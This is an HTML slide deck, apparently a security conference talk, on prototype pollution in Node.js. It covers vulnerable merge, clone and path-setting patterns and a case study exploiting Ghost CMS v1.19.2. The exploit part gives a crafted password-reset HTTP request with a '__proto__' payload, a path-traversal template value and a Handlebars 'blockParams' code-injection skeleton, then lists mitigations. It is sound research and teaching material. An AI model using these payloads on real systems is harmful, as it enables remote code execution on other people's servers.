@@ -1,0 +1,546 @@
+<!doctype html>
+<html>
+	<head>
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+		<title>Prototype pollution attack in NodeJS application</title>
+
+		<link rel="stylesheet" href="css/reveal.css">
+		<link rel="stylesheet" href="css/theme/black.css">
+
+		<!-- Theme used for syntax highlighting of code -->
+		<link rel="stylesheet" href="lib/css/zenburn.css">
+
+		<!-- Printing and PDF exports -->
+		<script>
+			var link = document.createElement( 'link' );
+			link.rel = 'stylesheet';
+			link.type = 'text/css';
+			link.href = window.location.search.match( /print-pdf/gi ) ? 'css/print/pdf.css' : 'css/print/paper.css';
+			document.getElementsByTagName( 'head' )[0].appendChild( link );
+		</script>
+	</head>
+	<body>
+		<div class="reveal">
+			<div class="slides">
+				<section data-markdown>
+					<script type="text/template">
+					# Prototype pollution attack
+					## by Olivier Arteau
+					</script>
+				</section>
+
+
+				<section data-markdown>
+					<script type="text/template">
+					## whoami
+
+					- Pentester and security researcher.
+					- I used to do web development before starting in infosec 4 years ago.
+					</script>
+				</section>
+
+				<section data-markdown>
+					<script type="text/template">
+					## Plan
+					- Intro to JavaScript
+					- What allows prototype pollution ?
+					- How can it be exploited ?
+					- Mitigation
+					</script>
+				</section>
+
+				<section>
+					<section data-markdown>
+					<script type="text/template">
+					## Intro to JavaScript
+
+					- Class declaration in JavaScript
+
+					```js
+ function Dog() {
+ 	
+ }
+ 
+ Dog.prototype.talk = function () {
+ 	return 42;
+ }
+ 
+ var myDog = new Dog();
+ myDog.talk(); // returns 42
+					```
+
+					</script>
+					</section>
+					
+					<section data-markdown>
+					<script type="text/template">
+					## Intro to JavaScript
+
+					- Base properties of Object
+
+					```js
+ var myDog = new Dog();
+ 
+ // Points to the function "Dog"
+ myDog.constructor; 
+ 
+ // Points to the class definition of "Dog"
+ myDog.constructor.prototype;
+ 
+ // Points to the class definition of "Dog"
+ myDog.__proto__;
+ 					```
+
+ 					</script>
+ 					</section>
+
+					<section data-markdown>
+					<script type="text/template">
+					## Intro to JavaScript
+
+					- Property access
+
+					```js
+ var myDog = new Dog();
+ var name = "__proto__";
+
+ myDog["__proto__"] === myDog.__proto__; 
+ myDog[name] === myDog.__proto__;
+ myDog["toString"] === myDog.toString;
+ 					```
+
+					</script>
+					</section>
+				</section>
+
+				<section>
+					<section data-markdown>
+					<script type="text/template">
+					## Prototype pollution ?
+
+					- Extension method of "Object" and other base type.
+					- Library like "prototype.js".
+					- Considered a bad practice.
+
+					```js
+Object.prototype.containsTheAnswer = function () {
+	return this.hasOwnProperty("42");
+}
+
+var a = { "42" : true };
+
+a.containsTheAnswer(); // true
+					```
+					</script>
+					</section>
+
+					<section data-markdown>
+					<script type="text/template">
+					### Prototype pollution attack ?
+
+					- What if the attacker can add property to the prototype of Object ?
+					</script>
+					</section>
+				</section>
+
+				<section>
+					<h1>What can allow this ?</h1>
+				</section>
+
+				<section>
+					<section data-markdown>
+					<script type="text/template">
+					## Merge operation
+
+					```js
+var a = { "a" : 1, "b" : 2 };
+var b = { "b" : 3, "d" : 4 };
+var c = merge(a, b); // { "a" : 1, "b" : 3, "d": 4 };
+					```
+					</script>
+					</section>
+
+					<section data-markdown>
+					<script type="text/template">
+					## Merge operation
+
+					```js
+function merge(a, b) {
+	for (var attr in b) {
+		if (isobject(a[attr]) && isobject(b[attr])) {
+			merge(a[attr], b[attr]);
+		} else {
+			a[attr] = b[attr];
+		}
+	}
+
+	return a;
+}
+					```
+					</script>
+					</section>
+
+					<section data-markdown>
+					<script type="text/template">
+					## Merge operation
+
+					```js
+var a = { "a" : 1, "b" : 2 };
+var b = JSON.parse('{"__proto__":{"polluted":1}}');
+var c = merge(a, b);
+var d = {};
+d.polluted // 1
+					```
+					</script>
+					</section>
+
+					<section data-markdown>
+					<script type="text/template">
+					## Merge operation
+
+					- Lot's of affected library including popular library such as lodash and Hoek.
+					- Details is in the paper.
+					</script>
+					</section>
+				</section>
+
+				<section>
+					<section data-markdown>
+					<script type="text/template">
+					## Clone operation
+
+					```js
+var a = { "a" : 1, "b" : 2 };
+var b = clone(a);
+b.a // 1
+b.b // 2
+					```
+					</script>
+					</section>
+
+					<section data-markdown>
+					<script type="text/template">
+					## Clone operation
+
+					```js
+function clone(a) {
+	return merge({}, a);
+}
+
+var a  = JSON.parse('{"__proto__":{"polluted":1}}');
+var b = clone(a);
+var d = {};
+d.polluted // 1
+
+					```
+					</script>
+					</section>
+
+					<section data-markdown>
+					<script type="text/template">
+					## Clone operation
+
+					- Only one library was found to have this issue.
+					- Details is in the paper.
+					</script>
+					</section>
+
+				</section>
+
+				<section>
+					<section data-markdown>
+					<script type="text/template">
+					## Path assignment operation
+
+					```js
+var obj = { b : { "test" : 321 } };
+setValue(obj, "b.test", 123);
+obj.b.test; // 123
+					```
+					</script>
+					</section>
+
+					<section data-markdown>
+					<script type="text/template">
+					## Path assignment operation
+
+					```js
+var obj = {  };
+setValue(obj, "__proto__.polluted", 1);
+var d = {};
+d.polluted // 1
+
+					```
+					</script>
+					</section>
+
+					<section data-markdown>
+					<script type="text/template">
+					## Path assignment operation
+
+					- By design
+					- Details is in the paper.
+					</script>
+					</section>
+
+				</section>
+
+				<section>
+					
+					<section data-markdown>
+					<script type="text/template">
+					## Exploitation time !
+
+					- Case study for this research was Ghost CMS v1.19.2
+					- It's a large application
+					- It uses an affected library with user-input.
+					</script>
+					</section>
+
+					<section data-markdown>
+					<script type="text/template">
+					## Identification
+
+					- First step is to identify where the affected library is used with user input.
+					- File : /core/server/api/authentication.js
+
+					```js
+function doReset(options) {
+  var data = options.data.passwordreset[0],
+    resetToken = data.token,
+    oldPassword = data.oldPassword,
+    newPassword = data.newPassword;
+
+  return settingsAPI.read(_.merge({key: 'db_hash'}, options))
+  [...]
+
+					```
+					</script>
+					</section>
+
+					<section data-markdown>
+					<script type="text/template">
+					## Identification
+
+					- With this in mind, we can build the skeleton of our payload.
+
+					```
+PUT /ghost/api/v0.1/authentication/passwordreset HTTP/1.1
+Host: localhost:2368
+Content-Type: application/json; charset=UTF-8
+Connection: close
+
+{"passwordreset": [{
+	"token": "MHx0ZXN0QHRlc3QuY29tfHRlc3RzZXRlc3Q=",
+	"email": "test1321321@test.com",
+	"newPassword": "kdsflaksldk930209",
+	"ne2Password": "kdsflaksldk930209",
+	"__proto__": {
+
+	}
+}]}
+					```
+					</script>
+					</section>
+
+					<section data-markdown>
+					<script type="text/template">
+					## Don't crash !
+
+					- Adding any property causes almost all endpoint to crash before fully executing.
+					- The first objective is to identify which property needs to be added so that at least one endpoint reaches an interesting point.
+					</script>
+					</section>
+
+					<section data-markdown>
+					<script type="text/template">
+					## Don't crash !
+
+					- The target endpoint for this exploit will be the main page.
+					- The interesting point we want to reach is the rendering of any template.
+					</script>
+					</section>
+
+					<section data-markdown>
+					<script type="text/template">
+					## Don't crash !
+
+					- First strategy : Add the missing value that cause "undefined" exception.
+					- File : /core/server/controllers/channel.js<nbr><nbr>
+					```js
+// Call fetchData to get everything we need from the API
+return fetchData(res.locals.channel).then(
+    function handleResult(result) {
+    // If page is greater than number of pages we [...]
+    if (pageParam > result.meta.pagination.pages) {
+        [...]
+    }
+					```
+
+					- To fix this, we will pollute this value.
+					```js
+"meta": { "pagination": { "pages": "100" } }
+					```
+					</script>
+					</section>
+
+					<section data-markdown>
+					<script type="text/template">
+					## Don't crash !
+
+					- Second strategy : Avoiding dead-end
+					- Sometimes the application will crash at a point where injecting additional value doesn't help.
+					- Identify property that will avoid taking the "dead-end" code path.
+					</script>
+					</section>
+
+					<section data-markdown>
+					<script type="text/template">
+					## Don't crash !
+
+					- Third strategy : Fixing recursion
+
+					```js
+Object.prototype.foo = {};
+({}).foo.foo.foo.foo.foo === ({}).foo;
+					```
+
+					- Fixed version.
+
+					```js
+Object.prototype.foo = { "foo" : "" };
+({}).foo.foo === "";
+					```					
+					</script>
+					</section>
+
+					<section data-markdown>
+					<script type="text/template">
+					## Exploit !
+
+					- Abusing property injection.
+					- The rendered template is lazy loaded.
+
+					```js
+module.exports.setTemplate = 
+	function setTemplate(req, res, data) {
+		var routeConfig = res._route || {};
+		if (res._template && !req.err) {
+			return;
+		}
+		if (req.err) {
+			res._template = _private.getTemplateForError(
+				res.statusCode);
+			return;
+		}
+		[...]
+					```
+					</script>
+					</section>
+
+					<section data-markdown>
+					<script type="text/template">
+					## Exploit !
+
+					- Before choosing a final "_template" value, I pointed it to a local file that I control.
+					- Did some fuzzing with this file to identity which content could help us inject arbitrary code.
+					</script>
+					</section>
+
+					<section data-markdown>
+					<script type="text/template">
+					## Exploit !
+
+					- Partial invocation can be corrupted to execute code of our choice.
+					- The property that will contain our arbitrary code is "blockParams".
+					</script>
+					</section>
+
+					<section data-markdown>
+					<script type="text/template">
+					## Exploit !
+
+					- We have to find a template which contains a partial invocation.
+					- All the template of the application that contain partial invocation crash during the rendering.
+					- Test case template are shipped in the "express-hbs" module.
+					- Final target : "../../../current/node_modules/express-hbs/test/issues/23/emptyComment.hbs"
+					</script>
+					</section>
+
+					<section data-markdown>
+					<script type="text/template">
+					## Exploit !
+
+					```js
+"_template": "../../../current/node_modules/express-hbs/test/issues/23/emptyComment.hbs"
+"program": {
+	"opcodes": [{
+		"opcode": "pushLiteral",
+		"args": ["1"]
+	}, {
+		"opcode": "appendEscaped",
+		"args": ["1"]
+	}],
+	"children": [],
+	"blockParams": "CODE GOES HERE"
+}
+					```
+					</script>
+					</section>
+
+					<section data-markdown>
+					<script type="text/template">
+					## Demo !
+
+					</script>
+					</section>
+
+				</section>
+
+				<section>
+					<section data-markdown>
+					<script type="text/template">
+					## Mitigation
+
+					- Object.freeze(Object.prototype)
+					- JSON schema validation with library like ajv.
+					- Map instead of Object
+
+					</script>
+					</section>
+				</section>
+
+				<section>
+					<section data-markdown>
+					<script type="text/template">
+					## GitHub
+
+					- https://github.com/HoLyVieR/prototype-pollution-nsec18
+
+					</script>
+					</section>
+				</section>
+
+			</div>
+		</div>
+
+		<script src="lib/js/head.min.js"></script>
+		<script src="js/reveal.js"></script>
+
+		<script>
+			// More info about config & dependencies:
+			// - https://github.com/hakimel/reveal.js#configuration
+			// - https://github.com/hakimel/reveal.js#dependencies
+			Reveal.initialize({
+				dependencies: [
+					{ src: 'plugin/markdown/marked.js' },
+					{ src: 'plugin/markdown/markdown.js' },
+					{ src: 'plugin/notes/notes.js', async: true },
+					{ src: 'plugin/highlight/highlight.js', async: true, callback: function() { hljs.initHighlightingOnLoad(); } }
+				]
+			});
+		</script>
+	</body>
+</html>
